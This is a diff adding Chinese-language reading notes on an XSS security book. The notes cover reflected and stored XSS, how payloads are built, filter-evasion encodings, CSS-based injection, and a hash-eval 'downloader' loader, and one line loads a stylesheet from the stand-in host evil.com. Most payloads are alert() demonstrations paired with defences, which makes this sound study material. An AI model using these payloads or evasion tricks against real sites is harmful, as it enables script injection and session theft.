@@ -1,0 +1,109 @@
+---
+Title: XSS跨站脚本攻击剖析与防御-读书笔记
+author: Young
+date: 2017-01-03
+tags: [XSS, CS, Security, 读书笔记，跨站脚本]
+---
+
+初次了解cross-site scripting, 阅读完第一章第二章，感觉需要精读和理解的知识点不少，先摘抄下来，以供之后查阅。
+
+#### 什么是xss跨站脚本？
+计算机安全漏洞，web应用程序中的，是由于web应用程序对用户的输入过滤不足而产生的
+
+#### xss的分类
+反射型：主要用于将恶意脚本附加到URL地址的参数中。特点是用户点击时触发，而且只执行一次，非持久化，所以称为反射型。常出现在搜索栏，用户登入口，常用来窃取客户端Cookies或进行钓鱼欺骗
+
+持久型：攻击者实现将恶意javascript代码上传或者存储在漏洞服务器中，只要受害者浏览包含此恶意代码的页面，就会被执行。一般出现在网站的留言，评论，博客日志等交互处。
+
+#### 发掘
+用```<textarea>```来闭合前后的对应的标记，中间写```<script>```代码，是一个典型的持久型XSS，并且在管理员查看留言时才出发，攻击的对象是后台管理员。
+
+程序没有过滤任何有害字符，从而导致一个持久型xss的产生
+
+#### xss的构造剖析
+* 利用< >标记注射html/javascript,
+ * ```<script>alert('XSS');</script>```
+ * 防御：过滤< >和```<script>```字样
+* 利用HTML标签属性值执行XSS 
+ * ```<table background="javascript:alert(/xss/)"></table>```
+ * ```<img src="javascript:alert('xss');"```
+ * 防御：过滤```<javascript>```等关键字
+* 空格回车Tab，一类的键位符
+ * 原因比较复杂，JavaScript语句通常以分号结尾，如果javascript引擎确定一个语句是完整的，而这一行的结尾有换行符，那么可以省略分号。有时候，引擎没有把换行符解释为语句的终止符，js会继续处理发现内容，直到遇到分号或者完整语句.
+ * 拆分关键字的技巧成功执行了跨站脚本代码
+  
+  ```
+ 	<img src="javas
+ 	cript:
+ 	alert(/xss/)" witdth=100>
+  ```
+
+* 对标签属性值的转码
+ * t的ASCII码值是116，可以用```&#116```来表示，冒号可以用```&#58```来表示，```javascript:alert('xss');```转码后可以是```javascrip&#116&#58alert(/xss/)```
+ * 防范利用HTML标签属性值编码的XSS,最好也过滤```&#\```等字符
+* 产生自己的事件
+ * 测试事件型的跨站脚本，还有大量的事件可以运用：
+
+	```
+<input type="button" value="click me" onclick="alert('click me')"
+onResume
+onReverse
+onRowDelete
+onSeek
+...
+	```
+
+* 利用CSS跨站解析
+ * CSS中的expression执行js代码；HTML标签的style属性执行js代码，如下两个例子
+ * ```<dev style="width: expression(alert('xss'));">```
+ * ```<div style="list-style-image:url(javascript:alert('xss'))">```
+ * CSS样式表不需要嵌入到HTML代码中，他能从其他文件甚至是从不同的目标机器上进行引用；除了使用link标签外，在网页中引用外部CSS还可以利用@import将其导入；@import还有一个特性，能直接执行js代码。如下三个例子
+ * ```<link rel="stylesheet" href="http://www.evil.com/attack.css">```
+ * ```<style type='type/css'>@import url(http://attack.css);</style>```
+ * ```<style>@import 'javascript:alert("xss")';</style>```
+ * 防御：过滤包含expression,javascript,import等敏感字符的样式表
+
+* 扰乱过滤规则
+ * 大小写混淆
+ * 双引号改单引号，不使用引号
+ * 不同的全角字符
+ * 注释字符干扰过滤器：```/**/ \  \0```等
+
+* 字符编码，十进制&#，十六进制&#x
+* JavaScript中有一个eval函数，可计算字符串并执行其中的js代码，js支持unicode,escapes，十六进制，八进制等
+
+* 拆分跨站法：当一个评论框输入字符有限时，那么用多个来联合
+
+#### shellcode的调用
+* 除了使用```<script>```标签动态调用远程JavaScript，还可以运用基于DOM的方法创建和插入节点
+* window.location.hash.substr(1),抽取#之后的字符
+```
+http://www.bug.com/view.php?sort="><scripteval(location.hash.substr(1))</script>#alert('xss')
+```
+* xss downloader,事先把shellcode写在网站的某个页面，然后利用XMLHTTP控件向网站发送http请求，post或者get，然后执行返回数据，关键点，用indexOf()函数计算BOF|和EOF|的位置，再用substring()函数方法取出字符串，最后用unescape()方法解码执行
+```eval(unescape(b.substring(b.indexof('BOF|')+4, b.indexof('|EOF'))))```
+
+* 备选存储技术,把xss shellcode存储在客户端本地域中，例如http cookie,flash共享对象，UserData, localStorage.
+ * HTML5提供了两种在客户端存储数据的新方法，localStorage and sessionStorage，```window.localStorage.a```
+ 
+ ```
+ <script>
+ localStorage.a="xss";
+ document.write(localStorage.a);
+ if (localStorage.count)
+ {
+ 	localStorage.count=Number(localStorage.count) + 1;
+ }else{
+ 	localStorage.count = 1;
+ }
+ document.write("访问次数" + localStorage.count + "times");
+ </script>
+ ```
+ 
+#### cookie窃取攻击剖析
+* Cookie是用户浏览网页时存储在用户机器上的小文本文件，记录了与用户相关的一些状态或者设置，例如用户名，ID，访问次数等
+* Cookie的时效是一个很重要的属性，持久型Cookie以文本形式存储在硬盘上由浏览器存取，临时型Cookie也称为会话Cookie，存储在内存中，关闭浏览器的时候消失
+* 若要创建一个cookie，把特定格式的字符串赋值给document.cookie
+
+#### 会话劫持剖析
+* Session和Cookie的最大区别在于，Session是保存在服务器的内存里，而Cookie保存于浏览器或客户端文件里面
